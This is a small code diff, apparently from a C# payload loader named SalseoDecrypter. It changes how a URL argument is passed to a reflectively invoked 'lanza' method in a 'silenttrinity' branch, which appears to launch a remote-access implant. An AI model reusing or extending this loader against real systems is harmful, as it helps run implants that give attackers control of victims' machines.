@@ -198,7 +198,7 @@ namespace SalseoDecrypter
             if (funcion == "silenttrinity")
             {
                 string URLSILENT = args[3].ToString();
-                string[] argumentos = new string[] { URLSILENT + " " };
+                string[] argumentos = new string[] { URLSILENT };
                 Type myType = salsongo.GetTypes()[0];
                 MethodInfo Method = myType.GetMethod("lanza");
                 object myInstance = Activator.CreateInstance(myType);
